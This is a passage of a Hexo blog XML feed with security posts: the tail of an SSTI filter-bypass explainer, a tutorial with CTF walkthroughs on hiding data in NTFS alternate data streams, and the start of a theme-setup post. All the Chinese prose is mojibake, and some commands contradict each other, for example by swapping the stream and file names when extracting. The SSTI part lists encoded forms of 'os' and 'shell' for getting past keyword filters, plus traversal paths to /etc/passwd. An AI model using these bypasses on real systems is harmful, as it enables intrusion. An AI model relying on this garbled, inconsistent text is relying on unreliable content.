<code>\\u[0-9A-Fa-f]&#123;4&#125;</code></h3><h4 id="âœ…-åŒ¹é…-Unicode-ç¼–ç "><a href="#âœ…-åŒ¹é…-Unicode-ç¼–ç " class="headerlink" title="âœ… åŒ¹é… Unicode ç¼–ç "></a>âœ… åŒ¹é… <strong>Unicode ç¼–ç </strong></h4><ul><li>ç”¨é€”ï¼šç»•è¿‡å…³é”®è¯è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼š<ul><li><code>\u006f\u0073</code> â <code>os</code></li><li><code>\u0073\u0068\u0065\u006c\u006c</code> â <code>shell</code></li></ul></li></ul><hr><h3 id="3-0-9A-Fa-f-2"><a href="#3-0-9A-Fa-f-2" class="headerlink" title="3. %[0-9A-Fa-f]{2}"></a>3. <code>%[0-9A-Fa-f]&#123;2&#125;</code></h3><h4 id="âœ…-åŒ¹é…-URL-ç¼–ç "><a href="#âœ…-åŒ¹é…-URL-ç¼–ç " class="headerlink" title="âœ… åŒ¹é… URL ç¼–ç "></a>âœ… åŒ¹é… <strong>URL ç¼–ç </strong></h4><ul><li>ç”¨é€”ï¼šç»•è¿‡ URL è¯·æ±‚ä¸­çš„é»‘åå•ï¼Œä¾‹å¦‚ï¼š<ul><li><code>%6f%73</code> â <code>os</code></li><li><code>%2e%2e</code> â <code>..</code>ï¼ˆç›®å½•ç©¿è¶Šï¼‰</li></ul></li></ul><hr><h3 id="4-A-Za-z0-9-1-3-b"><a href="#4-A-Za-z0-9-1-3-b" class="headerlink" title="4. \.[A-Za-z0-9]{1,3}\b"></a>4. <code>\.[A-Za-z0-9]&#123;1,3&#125;\b</code></h3><h4 id="âœ…-åŒ¹é…-æ–‡ä»¶æ‰©å±•åæˆ–ç±»å±æ€§"><a href="#âœ…-åŒ¹é…-æ–‡ä»¶æ‰©å±•åæˆ–ç±»å±æ€§" class="headerlink" title="âœ… åŒ¹é… æ–‡ä»¶æ‰©å±•åæˆ–ç±»å±æ€§"></a>âœ… åŒ¹é… <strong>æ–‡ä»¶æ‰©å±•åæˆ–ç±»å±æ€§</strong></h4><ul><li>ä¾‹å¦‚ï¼š<ul><li><code>.py</code>, <code>.sh</code>, <code>.exe</code>, <code>.ls</code>, <code>.os</code></li><li>æˆ– <code>.os</code>, <code>.eval</code>, <code>.exec</code>, <code>.subprocess</code></li></ul></li><li>ç”¨äºè®¿é—®å±æ€§ï¼š<code>obj.__class__</code>, <code>func.__globals__</code>, ç­‰ç­‰ã€‚</li></ul><hr><h3 id="5"><a href="#5" class="headerlink" title="5. [\\\/]"></a>5. <code>[\\\/]</code></h3><h4 id="âœ…-åŒ¹é…-è·¯å¾„åˆ†éš”ç¬¦"><a href="#âœ…-åŒ¹é…-è·¯å¾„åˆ†éš”ç¬¦" class="headerlink" title="âœ… åŒ¹é… è·¯å¾„åˆ†éš”ç¬¦"></a>âœ… åŒ¹é… <strong>è·¯å¾„åˆ†éš”ç¬¦</strong></h4><ul><li><code>/</code> å’Œ <code>\</code> å¯ç”¨äºæ–‡ä»¶è·¯å¾„è®¿é—®ï¼ˆåŒ…æ‹¬ Linux å’Œ Windowsï¼‰<ul><li>å¦‚ï¼š<code>../../flag.txt</code>, <code>\windows\system32\cmd.exe</code></li></ul></li></ul><hr><h3 id="6"><a href="#6" class="headerlink" title="6. \.\."></a>6. <code>\.\.</code></h3><h4 id="âœ…-åŒ¹é…-ç›®å½•ç©¿è¶Š"><a href="#âœ…-åŒ¹é…-ç›®å½•ç©¿è¶Š" class="headerlink" title="âœ… åŒ¹é… ç›®å½•ç©¿è¶Š"></a>âœ… åŒ¹é… <strong>ç›®å½•ç©¿è¶Š</strong></h4><ul><li>æ˜ç¡®é˜²æ­¢è®¿é—®ä¸Šå±‚ç›®å½•<ul><li>å¦‚ï¼š<code>../../etc/passwd</code></li><li>æˆ–ç”¨äºè®¿é—®æ•æ„Ÿæ–‡ä»¶æˆ–é…ç½®æ–‡ä»¶</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSTI</tag>
      
      <tag>ææƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NTFSæ•°æ®æµéšå†™</title>
    <link href="/2025/05/20/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <url>/2025/05/20/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1 id="NTFSæ•°æ®æµéšå†™"><a href="#NTFSæ•°æ®æµéšå†™" class="headerlink" title="NTFSæ•°æ®æµéšå†™"></a>NTFSæ•°æ®æµéšå†™</h1><h2 id="ä»€ä¹ˆæ˜¯NTFS"><a href="#ä»€ä¹ˆæ˜¯NTFS" class="headerlink" title="ä»€ä¹ˆæ˜¯NTFS"></a>ä»€ä¹ˆæ˜¯NTFS</h2><p>NTFSï¼ˆ<strong>New Technology File System</strong>ï¼‰æ˜¯å¾®è½¯å¼€å‘çš„ä¸€ç§<strong>æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼Œç”¨äºåœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ç®¡ç†ç£ç›˜ä¸Šçš„æ•°æ®ã€‚å®ƒæ˜¯åœ¨1993å¹´éšWindows NT 3.1é¦–æ¬¡å¼•å…¥çš„ï¼Œæ˜¯FATï¼ˆå¦‚FAT16ã€FAT32ï¼‰çš„ç»§ä»»è€…ã€‚</p><p>NTFSäº¤æ¢æ•°æ®æµ(ç®€ç§°<strong>ADS</strong>)æ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œå°±æ˜¯è¯´é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ã€‚å®ƒä½¿ç”¨èµ„æºæ´¾ç”Ÿæ¥ç»´æŒä¸æ–‡ä»¶ç›¸å…³çš„ä¿¡æ¯ã€‚â€”â€”â€”â€”ç™¾åº¦ç™¾ç§‘</p><p>åœ¨ NTFS æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶å¯ä»¥æœ‰ <strong>å¤šä¸ªæ•°æ®æµï¼ˆData Streamsï¼‰</strong>ï¼Œè€Œæ™®é€šç”¨æˆ·é€šå¸¸åªæ¥è§¦åˆ°â€œä¸»æ•°æ®æµâ€ï¼Œä¹Ÿå°±æ˜¯ä½ åŒå‡»æ‰“å¼€æ—¶çœ‹åˆ°çš„å†…å®¹ã€‚ä½†äº‹å®ä¸Šï¼ŒNTFS å…è®¸æ–‡ä»¶é™„åŠ â€œå¤‡ç”¨æ•°æ®æµï¼ˆAlternate Data Streamsï¼‰â€ï¼Œè¿™äº›æµä¸ä¼šåœ¨èµ„æºç®¡ç†å™¨ä¸­æ˜¾ç¤ºï¼Œä¹Ÿä¸ä¼šå½±å“ä¸»æ–‡ä»¶çš„æ­£å¸¸ä½¿ç”¨ã€‚</p><p>è¿™å°±ä¸º<strong>ä¿¡æ¯éšè—ï¼ˆéšå†™ï¼‰</strong>æä¾›äº†ä¸€ç§å¤©ç„¶çš„æ–¹å¼ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹NTFSäº¤æ¢æ•°æ®æµéšå†™ã€‚</p><h2 id="NTFSæ•°æ®æµéšå†™-1"><a href="#NTFSæ•°æ®æµéšå†™-1" class="headerlink" title="NTFSæ•°æ®æµéšå†™"></a>NTFSæ•°æ®æµéšå†™</h2><h3 id="1-å•æ–‡ä»¶æµéšè—"><a href="#1-å•æ–‡ä»¶æµéšè—" class="headerlink" title="1.å•æ–‡ä»¶æµéšè—"></a>1.å•æ–‡ä»¶æµéšè—</h3><p>é¦–å…ˆåœ¨Dç›˜æ‰“å¼€cmdå‘½ä»¤çª—å£,è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤åˆ›å»ºä¸€ä¸ªNTFSæ•°æ®æµ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">echo</span> &quot;i am a test&quot; &gt; :m0re.txt<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šå‘ç°dç›˜æ ¹ç›®å½•ä¸‹å¹¶æ²¡æœ‰åä¸º<code>:m0ra.txt</code>çš„æ–‡æœ¬æ–‡æ¡£</p><p>è¿™æ˜¯å› ä¸º<code>:m0ra.txt</code>æ˜¯NTFSæ•°æ®æµï¼Œä¸ä¼šåœ¨èµ„æºç®¡ç†å™¨ä¸­æ˜¾ç¤ºï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨windowsè‡ªå¸¦çš„notepadæŸ¥çœ‹ï¼Œå‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">notepad :m0re.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_17-20-37.png" alt="PixPin_2025-05-20_17-20-37"></p><h3 id="2-å…³è”æ–‡ä»¶æµéšè—"><a href="#2-å…³è”æ–‡ä»¶æµéšè—" class="headerlink" title="2.å…³è”æ–‡ä»¶æµéšè—"></a>2.å…³è”æ–‡ä»¶æµéšè—</h3><ol><li><p>åˆ›å»ºä¸€ä¸ª<code>test.txt</code> å†™å…¥<code>This is a normal file</code></p></li><li><p>åœ¨<code>test.txt:hidden.txt</code>ï¼ˆä¹Ÿå°±æ˜¯å…³è”test.txtçš„NTFSæ•°æ®æµï¼‰é‡Œå†™å…¥<code>This is secret</code></p></li><li><p>ç”¨<code>type</code>è¯»å–æˆ–è€…ç›´æ¥åœ¨è®°äº‹æœ¬ä¸­æ‰“å¼€<code>test.txt</code>é‡Œé¢çš„å†…å®¹éƒ½æ˜¯<code>This is a normal file</code></p></li><li><p>ä½¿ç”¨<code>more</code>å‘½ä»¤å¯ä»¥è¯»å–åˆ°éšè—çš„NTFSæ•°æ®æµ</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_17-11-16.png" alt="PixPin_2025-05-20_17-11-16"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_17-14-39.png" alt="PixPin_2025-05-20_17-14-39"></p><p>å·²ç»æˆåŠŸçš„éšè—ä¿¡æ¯ï¼ŒæŸ¥çœ‹æ–¹å¼æœ‰ä¸¤ç§<br>ä¸€ç§æ˜¯ä½¿ç”¨windowsè‡ªå¸¦çš„more&#x2F;notepadæŸ¥çœ‹ï¼Œå‘½ä»¤å¦‚ä¸‹</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">more</span> &lt; <span class="hljs-keyword">test</span>.txt:hidden.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">notepad test.txt:hidden.txt<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·ï¼ˆåœ¨åé¢åˆ—å‡ºï¼‰</p><p>å…³è”æ–‡ä»¶æµéšè—ï¼Œä¸æ­¢å¯ä»¥éšè—æ–‡æœ¬æ•°æ®ï¼Œè¿˜å¯ä»¥éšè—å…¶ä»–çš„æ–‡ä»¶ï¼Œæ¯”å¦‚exeå¯æ‰§è¡Œæ–‡ä»¶ï¼Œpycæ–‡ä»¶ç­‰ã€‚è¿™é‡Œä½¿ç”¨typeå‘½ä»¤ï¼Œæ¥éšè—æ–‡ä»¶ã€‚</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> yincang.jpg &gt;suzhu.jpg:yincang.jpg#éšè—å›¾ç‰‡åˆ°å¦ä¸€å¼ å›¾ç‰‡ä¸­<br>#æŸ¥çœ‹æ–¹å¼ä½¿ç”¨windowsè‡ªå¸¦çš„mspaint.exe<br>mspaint.exe suzhu.jpg:yincang.jpg<br></code></pre></td></tr></table></figure><table><thead><tr><th>æ“ä½œ</th><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>å†™å…¥æ•°æ®æµ</td><td><code>type yincang.jpg &gt; suzhu.jpg:yincang.jpg</code></td><td>æŠŠå›¾ç‰‡å†™å…¥æ–‡ä»¶è‡ªèº«çš„éšè—æµä¸­</td></tr><tr><td>æŸ¥çœ‹æµæ˜¯å¦å­˜åœ¨</td><td><code>streams.exe suzhu.jpg</code> æˆ– <code>Get-Item -Path .\suzhu.jpg -Stream *</code></td><td>æŸ¥çœ‹æœ‰å“ªäº›éšè—æµ</td></tr><tr><td>æå–æµä¸ºæ–‡ä»¶ï¼ˆæœ€ç¨³å¦¥ï¼‰</td><td>ä½¿ç”¨ PowerShellï¼ˆè§ä¸‹ï¼‰</td><td>æ¨èç”¨äºå›¾ç‰‡ã€ZIPã€EXE ç­‰äºŒè¿›åˆ¶æ•°æ®</td></tr><tr><td>æ‰“å¼€éšè—å›¾ç‰‡</td><td>æå–åç”¨å›¾ç‰‡æŸ¥çœ‹å™¨æ‰“å¼€</td><td>ä¸å»ºè®®ç›´æ¥ç”¨ <code>more</code> è¯»å–å›¾ç‰‡</td></tr></tbody></table><p> æ³• Aï¼šä½¿ç”¨ <code>cmd</code> æå–åˆ°æ–‡ä»¶</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">more</span> &lt; yincang.jpg:suzhu.jpg &gt; extracted.jpg<br></code></pre></td></tr></table></figure><p>ç„¶åä½ å°±å¯ä»¥ç”¨å›¾ç‰‡æŸ¥çœ‹å™¨æ‰“å¼€ <code>extracted.jpg</code> äº†ã€‚</p><blockquote><p>âš  æ³¨æ„ï¼š<code>more</code> ä¼šé€è¡Œè¯»å–æ–‡æœ¬ï¼Œå› æ­¤å®ƒå¤„ç† <strong>äºŒè¿›åˆ¶æ•°æ®å¯èƒ½å‡ºé”™</strong>ï¼Œä¸å¤ªå¯é ï¼Œä½†å¯¹äºæŸäº›å°å›¾ç‰‡æœ‰æ•ˆã€‚</p></blockquote><p>ä½¿ç”¨ PowerShell æå–ä¸ºå­—èŠ‚æµ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$fs</span> = [<span class="hljs-type">System.IO.File</span>]::Open(<span class="hljs-string">&quot;suzhu.jpg:yincang.jpg&quot;</span>, <span class="hljs-string">&#x27;Open&#x27;</span>, <span class="hljs-string">&#x27;Read&#x27;</span>)<br><span class="hljs-variable">$bytes</span> = <span class="hljs-built_in">New-Object</span> byte[] <span class="hljs-variable">$fs</span>.Length<br><span class="hljs-variable">$fs</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$fs</span>.Length) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$fs</span>.Close()<br>[<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-string">&quot;recovered.jpg&quot;</span>, <span class="hljs-variable">$bytes</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åä½ å°±èƒ½ç”¨å›¾ç‰‡æŸ¥çœ‹å™¨æ‰“å¼€ <code>extracted.jpg</code> æ¥æŸ¥çœ‹éšè—çš„å›¾ç‰‡å†…å®¹ã€‚</p><h2 id="æ£€æµ‹NTFA-ADSçš„å·¥å…·"><a href="#æ£€æµ‹NTFA-ADSçš„å·¥å…·" class="headerlink" title="æ£€æµ‹NTFA-ADSçš„å·¥å…·"></a>æ£€æµ‹NTFA-ADSçš„å·¥å…·</h2><p><a href="https://www.nirsoft.net/utils/alternate_data_streams.html">AlternateStreamView - View&#x2F;Copy&#x2F;Delete NTFS Alternate Data Streams</a></p><p>[Ntfs Streams Editor][<a href="https://files.cnblogs.com/files/rainbow7/ntfsstreamseditor.zip]">https://files.cnblogs.com/files/rainbow7/ntfsstreamseditor.zip]</a></p><p>[lads][ <a href="https://files.cnblogs.com/files/rainbow7/lads.zip]">https://files.cnblogs.com/files/rainbow7/lads.zip]</a></p><p>å·¥å…·çš„ä½¿ç”¨åœ¨å®æˆ˜ä¸­ä»‹ç»ã€‚</p><h2 id="CTFä¾‹é¢˜å®æˆ˜"><a href="#CTFä¾‹é¢˜å®æˆ˜" class="headerlink" title="CTFä¾‹é¢˜å®æˆ˜"></a>CTFä¾‹é¢˜å®æˆ˜</h2><p>æ‰¾äº†å‡ ä¸ªNTFSæµæ•°æ®éšå†™çš„é¢˜ç›®ã€‚</p><h3 id="ACTFæ–°ç”Ÿèµ›2020-NTFSæ•°æ®æµ"><a href="#ACTFæ–°ç”Ÿèµ›2020-NTFSæ•°æ®æµ" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]NTFSæ•°æ®æµ"></a>[ACTFæ–°ç”Ÿèµ›2020]NTFSæ•°æ®æµ</h3><p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]NTFS%E6%95%B0%E6%8D%AE%E6%B5%81">BUUCTFåœ¨çº¿è¯„æµ‹</a></p><p>ä¸‹è½½å®Œä¹‹åç”¨WINRARè§£å‹<code>flag.rar</code>ï¼ˆéœ€è¦è§£å‹ä¸¤æ¬¡ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-25-43.png" alt="PixPin_2025-05-23_18-25-43"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-23-08.png" alt="PixPin_2025-05-23_18-23-08"></p><p>æ‰“å¼€è§£å‹ç¼©åæ–‡ä»¶å¤¹</p><p>ç­›é€‰æ–‡ä»¶å¤§å° çœ‹ä¸€ä¸‹çªå‡ºçš„293.txt</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-27-18.png" alt="PixPin_2025-05-23_18-27-18"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-29-34.png" alt="PixPin_2025-05-23_18-29-34"></p><p>æç¤º<strong>ADS</strong>ï¼Œç”¨å·¥å…·æ£€æµ‹ä¸€ä¸‹ã€‚</p><p>å…ˆç”¨NtfsStreamsEditorï¼Œ</p><p>åœ¨1ä¸­é€‰æ–‡ä»¶å†ç‚¹2æœç´¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-43-38.png" alt="PixPin_2025-05-23_18-43-38"></p><p>ç›´æ¥åŒå‡»æ‰“å¼€å¼‚å¸¸çš„293.txt:flag.txt<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-39-30.png" alt="PixPin_2025-05-23_18-39-30"></p><p>å¾—åˆ°flag <code>ACTF&#123;AAAds_nntfs_ffunn?&#125; </code></p><p>ç¬¬äºŒä¸ªä½¿ç”¨NtfsStreamsEditorã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_18-48-46.png" alt="PixPin_2025-05-23_18-48-46"></p><p>åœ¨è¿™é‡Œé€‰å‡ºè¦æ‰«æçš„æ–‡ä»¶</p><p>åŒå‡»ç­›é€‰å‡ºæ¥çš„<code>293.txt</code>,ä½†æ˜¯è¿™ä¸ªå·¥å…·ä¸èƒ½ç›´æ¥æ‰“å¼€ADS</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_18-55-12.png" alt="PixPin_2025-05-20_18-55-12"></p><p>è¿˜éœ€è¦æˆ‘ä»¬è¾“å…¥å‘½ä»¤æŸ¥çœ‹å†…å®¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">more</span> &lt; <span class="hljs-number">293</span>.txt:flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-20_19-03-00.png" alt="PixPin_2025-05-20_19-03-00"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯</p><p><strong>è§£å‹éœ€è¦ä½¿ç”¨winrarè§£å‹è½¯ä»¶ã€‚æ¶‰åŠNTFSæµçš„éƒ½éœ€è¦Win RARè§£å‹ã€‚</strong></p><h3 id="bugkuCTF-çŒ«ç‰‡-å®‰æ’-ã€å›¾ç‰‡éšå†™-NTFS-åç¼–è¯‘ã€‘"><a href="#bugkuCTF-çŒ«ç‰‡-å®‰æ’-ã€å›¾ç‰‡éšå†™-NTFS-åç¼–è¯‘ã€‘" class="headerlink" title="[bugkuCTF]çŒ«ç‰‡(å®‰æ’)ã€å›¾ç‰‡éšå†™+NTFS+åç¼–è¯‘ã€‘"></a>[bugkuCTF]çŒ«ç‰‡(å®‰æ’)ã€å›¾ç‰‡éšå†™+NTFS+åç¼–è¯‘ã€‘</h3><p> <img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-11-33.png" alt="PixPin_2025-05-23_19-11-33"></p><p>é¢˜ç›®ç»™äº†hint:LSB BGR NTFS</p><p>å…ˆåœ¨stegä¿®æ”¹é‡Œçœ‹ä¸€ä¸‹ï¼Œæ–‡ä»¶å¤´ä¸ºPNGï¼ŒsaveBin</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-18-00.png" alt="PixPin_2025-05-23_19-18-00"></p><p>ä¿å­˜ä»¥åæ‹‰åˆ°010é‡Œé¢å‘ç°æ–‡ä»¶å¤´ä¸å¯¹ï¼Œåˆ æ‰<code>FF FE</code>,ä¿®æ”¹åç¼€ä¸ºpngï¼Œæ‰“å¼€å‘ç°æ˜¯ä¸€èˆ¬äºŒç»´ç ï¼Œä¸¢åˆ°éšæ³¢é€æµä¿®å¤å®½é«˜</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-26-18.png" alt="PixPin_2025-05-23_19-26-18"></p><p>çœ‹èµ·æ¥ä¸å¤ªå¯¹åŠ²é¡ºä¾¿åä¸ªè‰²</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-19-17.png" alt="PixPin_2025-05-23_19-19-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-22-27.png" alt="PixPin_2025-05-23_19-22-27"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-29-36.png" alt="PixPin_2025-05-23_19-29-36"></p><p>æ‰«ç ç»“æœæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…,ä¸‹è½½åè§£å‹ç¼©</p><p><img src="E:\temp\PixPin_2025-05-23_19-35-45.png" alt="PixPin_2025-05-23_19-35-45"></p><p>å¾—åˆ°flag.txtç”¨æ£€æµ‹å·¥å…·æ£€æµ‹å‡ºæ¥flag.pyc(æ˜¯pythonç¼–è¯‘åçš„æ–‡ä»¶)<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-39-14.png" alt="PixPin_2025-05-23_19-39-14"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-05-23_19-40-22.png" alt="PixPin_2025-05-23_19-40-22"></p><p>å¯¼å‡ºï¼Œåœ¨ç½‘ç«™ï¼ˆ<a href="https://tool.lu/pyc/">pythonåç¼–è¯‘ - åœ¨çº¿å·¥å…·</a>ï¼Œç¼–è¯‘åä¸‹è½½ä¸‹æ¥ï¼Œè¿™é‡Œè¿˜éœ€è¦å†™ä¸€ä¸ªè§£å¯†è„šæœ¬ã€‚</p><pre><code class="hljs">def decode(ciphertext):    # æ¢å¤åŸå§‹é¡ºåº    ciphertext = ciphertext[::-1]    flag = &#39;&#39;    for i, val in enumerate(ciphertext):        val = int(val)        if i % 2 == 0:            val -= 10        else:            val += 10        c = chr(val)        flag += chr(i ^ ord(c))    return flagciphertext = [    &#39;96&#39;,    &#39;65&#39;,    &#39;93&#39;,    &#39;123&#39;,    &#39;91&#39;,    &#39;97&#39;,    &#39;22&#39;,    &#39;93&#39;,    &#39;70&#39;,    &#39;102&#39;,    &#39;94&#39;,    &#39;132&#39;,    &#39;46&#39;,    &#39;112&#39;,    &#39;64&#39;,    &#39;97&#39;,    &#39;88&#39;,    &#39;80&#39;,    &#39;82&#39;,    &#39;137&#39;,    &#39;90&#39;,    &#39;109&#39;,    &#39;99&#39;,    &#39;112&#39;]print(decode(ciphertext))</code></pre><p>è¿è¡Œåå¾—å‡º flag{Y@e_Cl3veR_C1Ever!}</p>]]></content>
    
    
    <categories>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NTFSæ•°æ®éšå†™</tag>
      
      <tag>pythonåç¼–è¯‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo fluidä¸»é¢˜-æ·»åŠ åˆ†ç±»åŠæ ‡ç­¾</title>
    <link href="/2025/04/24/Hexo-fluid%E4%B8%BB%E9%A2%98-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/"/>
    <url>/2025/04/24/Hexo-fluid%E4%B8%BB%E9%A2%98-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo-fluidä¸»é¢˜-æ·»åŠ åˆ†ç±»åŠæ ‡ç­¾"><a href="#Hexo-fluidä¸»é¢˜-æ·»åŠ åˆ†ç±»åŠæ ‡ç­¾" class="headerlink" title="Hexo fluidä¸»é¢˜-æ·»åŠ åˆ†ç±»åŠæ ‡ç­¾"></a>Hexo fluidä¸»é¢˜-æ·»åŠ åˆ†ç±»åŠæ ‡ç­¾</h1><h2 id="1-æ–°å»ºcategoriesï¼Œtagesé¡µé¢"><a href="#1-æ–°å»ºcategoriesï¼Œtagesé¡µé¢" class="headerlink" title="1.æ–°å»ºcategoriesï¼Œtagesé¡µé¢"></a>1.æ–°å»ºcategoriesï¼Œtagesé¡µé¢</h2><p><code>hexo new page categories</code><br>è¯¥å‘½ä»¤åœ¨sourceç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªcategoriesç›®å½•ï¼Œcategoriesç›®å½•ä¸‹æœ‰ä¸€ä¸ªindex.mdæ–‡ä»¶ã€‚</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> page <span class="hljs-string">&quot;tags&quot;</span><br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤åœ¨sourceç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªtagesç›®å½•ï¼Œç›®å½•ä¸‹æœ‰ä¸€ä¸ªindex.mdæ–‡ä»¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-24_21-26-48.png" alt="PixPin_2025-04-24_21-26-48"></p><h2 id="2-åœ¨æ–‡ç« ä¸­æ·»åŠ æ ‡ç­¾"><a href="#2-åœ¨æ–‡ç« ä¸­æ·»åŠ æ ‡ç­¾" class="headerlink" title="2. åœ¨æ–‡ç« ä¸­æ·»åŠ æ ‡ç­¾"></a>2. åœ¨æ–‡ç« ä¸­æ·»åŠ æ ‡ç­¾</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-24_21-27-48.png" alt="PixPin_2025-04-24_21-27-48"></p><p>éœ€è¦æ³¨æ„ç¼©è¿›</p><p>tagesä¸º</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>-<span class="hljs-meta">%</span><span class="hljs-number">00</span> <br></code></pre></td></tr></table></figure><p>categoriesä¸º</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">00</span><span class="hljs-meta">%</span><span class="hljs-number">00</span>-<span class="hljs-meta">%</span><span class="hljs-number">00</span>[]<br></code></pre></td></tr></table></figure><p>å¦‚æœä¸åŠ ä¸­æ‹¬å·å†™å¤šä¸ªcategoriesä¼šè¿™æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-24_20-59-20.png" 